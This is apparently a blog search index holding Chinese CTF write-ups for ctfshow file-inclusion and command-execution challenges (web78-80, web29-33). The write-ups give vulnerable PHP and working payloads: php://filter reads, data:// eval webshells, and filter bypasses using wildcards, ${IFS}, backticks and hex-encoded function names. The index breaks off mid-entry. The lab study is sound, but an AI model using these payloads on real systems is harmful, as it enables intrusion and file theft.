<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 10:52:43</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    首先这是一个 file 关键字的get参数传递， <code>php://</code> 是一种协议名称(命令执行web37中也有简单介绍)， <code>php://filter/</code> 是一种访问本地文件的的协议， <code>/read=convert.base64-encode/</code> 表示读取的方式是base64编码， <code>resource=index.php</code> 表示目标文件名为index.php。</p><p>​    通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的<code>include()</code>函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p><p>​    而include的内容是由用户控制的，所以通过我们传递的 <code>file</code> 参数，是 <code>include()</code> 函数引入了index.php的base64编码格式，因为是<code>base64</code>编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p><p>所以最终的payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/78-1.jpg"></p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:10:14</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 <code>php</code> ，所以可以使用 <code>data://</code> 协议进行绕过：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=file=data:<span class="hljs-regexp">//</span>text/plain,&lt;?=eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;<br><span class="hljs-regexp">//</span> 一下是 POST 数据<br><span class="hljs-number">1</span>=system(<span class="hljs-string">&quot;tac falg.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>​    或者也可以使用下面的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs====&gt;<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/79-1.jpg"></p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow命令执行笔记</title>
    <link href="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;php<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析考点：</strong></p><p>这题中看到两个函数</p><p>​    <strong>eval()</strong></p><p>​    <strong>preg_match</strong></p><p>通过百度可知</p><p>​    <code>eval()</code> 函数的功能是获取返回值</p><p>​    <code>preg_match</code> 是执行正则表达式，在题中是起到一个过滤的作用。</p><p><strong>解题：</strong></p><p>​    在代码中，我们可以看到过滤了 flag 而且不区分大小写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">所需要使用的知识点 通配符<br><span class="hljs-number">1</span>. * 可以匹配<span class="hljs-number">0</span>或多个字符<br><span class="hljs-number">2</span>. ? 可以匹配任意一个字符<br><span class="hljs-number">3</span>. <span class="hljs-selector-attr">[abcd]</span> 匹配abcd中任何一个字符<br><span class="hljs-number">4</span>. <span class="hljs-selector-attr">[a-z]</span> 匹配范围<span class="hljs-selector-tag">a</span>到z，表示范围的意思 <span class="hljs-selector-attr">[]</span>匹配中括号中的任意一个字符<br></code></pre></td></tr></table></figure><p>​    所以在这 flag 可以用 f* 或 f??? 代替</p><p>​    所以这个题的payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f*.php&quot;</span>);<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f*&quot;</span>);<br>?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat f???.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>​    也可以使用 cp 命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=system(<span class="hljs-string">&quot;cp fla?.php 1.txt&quot;</span>);    <span class="hljs-regexp">//</span>意思就是复制flag.php文件 明名为 <span class="hljs-number">1</span>.txt<br>url<span class="hljs-regexp">/1.txt/</span><span class="hljs-regexp">/然后查看1.txt</span><br></code></pre></td></tr></table></figure><p>​    再补充一个，绕过可以用引号，反斜杠</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">flag</span>=fl\ag=fl<span class="hljs-string">&#x27;&#x27;</span>ag<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/29-1.jpg"></p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;php<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: hlxa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span>: Modified by:hlxa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span>: Modified time: 2020-09-04 00:42:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: hlxa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: http://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 flag,system,php关键字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所需知识点反引号执行命令<br></code></pre></td></tr></table></figure><p>​    因为过滤掉了 <code>system</code>，我们就得选择其他的命令执行函数</p><p>​    最常用的无需 <code>echo</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>. system()<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>. passthru()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>​    需用 <code>echo</code> 函数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 反引号 — `` 有 system() 的作用<br><span class="hljs-bullet">2.</span> exec();<br><span class="hljs-bullet">3.</span> shell<span class="hljs-emphasis">_exec();</span><br></code></pre></td></tr></table></figure><p><strong>实验：</strong></p><p>​    较上题比较，这题过滤多了 system 和 php</p><p>​    所以 flag.php 中php可以使用 p?p 或 p* 代替</p><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;cat fl&#x27;&#x27;ag.p?p&quot;</span>);<br><span class="hljs-string">?c</span>=echo (<span class="hljs-string">`cat fl&#x27;&#x27;ag.p?p`</span>);<br><span class="hljs-string">?c</span>=exec(<span class="hljs-string">`cp fl* 1.txt`</span>);<span class="hljs-regexp">//</span>然后接着访问 url/<span class="hljs-number">1</span>.txt<br><span class="hljs-string">?c</span>=shell_exec(<span class="hljs-string">&quot;cp f* 2.txt&quot;</span>);<span class="hljs-regexp">//</span>然后让问 url/<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/30-1.jpg"></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/30-2.jpg"></p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这道题比之前的题多过滤了 cat,sort,shell,反斜杠(\),空格,点(.)</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> 过滤时，可以代替绕过的姿势<br></code></pre></td></tr></table></figure><ol><li><p><strong>tac: 从最后一行开始显示，是 cat 的反向显示</strong></p></li><li><p><strong>more: 一页一页的显示档案内容</strong></p></li><li><p><strong>less: 与 more 类似</strong></p></li><li><p><strong>head: 查看文档的前几行</strong></p></li><li><p><strong>tail: 查看文档的后几行</strong></p></li><li><p><strong>nl: 显示的时候，顺便输入行号</strong></p></li><li><p><strong>od: 以二进制的方式读取文档内容</strong></p></li><li><p><strong>vi: 一种编辑器</strong></p></li><li><p><strong>uniq: 查看</strong></p></li><li><p><strong>vim: 一种编译器</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">空格过滤时，可以代替绕过的姿势<br></code></pre></td></tr></table></figure></li><li><p> ${IFS}</p></li><li><p> $IFS$1</p></li><li><p> ${IFS</p></li><li><p> %20</p></li><li><p> &lt; 和 &lt;&gt; 重定向符</p></li><li><p> %09</p></li></ol><p><strong>实验：</strong></p><p>​    这道题过滤把主要的空格给过滤了，所以需要添加一个空格过滤符号。</p><p>​    这题的payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo(`more<span class="hljs-variable">%09</span>f*`)<span class="hljs-comment">;//more也可以写成less,nl,uniq,tac</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>passthru(<span class="hljs-string">&quot;tac%09f*&quot;</span>)<span class="hljs-comment">;//tac也可以写成less,nl,uniq,more</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo`strings<span class="hljs-variable">%09</span>f*`<span class="hljs-comment">;</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="hljs-string">&quot;nl%09fl*&quot;</span>)<span class="hljs-comment">;//等价于system。这个学到了! nl同样可以替换为more,less,uniq,tac,strings</span><br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/31-1.jpg"></p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    又过滤了 shell,单引号(‘),反引号(`),echo,分号(;),括号(())</p><p>​    分号可以使用 ?&gt; 代替，括号可以使用 “” 绕过，所以使用文件包含的方式</p><p><strong>实验：</strong></p><p>​    所以 payload 为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-string">&quot;$_GET[1]&quot;</span>?&gt;&amp;=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=falg.php<br></code></pre></td></tr></table></figure><p>​    这题还可以使用伪协议</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?c=<span class="hljs-built_in">include</span><span class="hljs-string">&quot;$_POST[1]&quot;</span><span class="hljs-meta">?&gt;</span><br><span class="hljs-number">1</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/32-1.jpg"></p><p>再使用 base64 工具转换就可以得到 flag 值</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这题过滤多了双引号，所以在上一题 payload 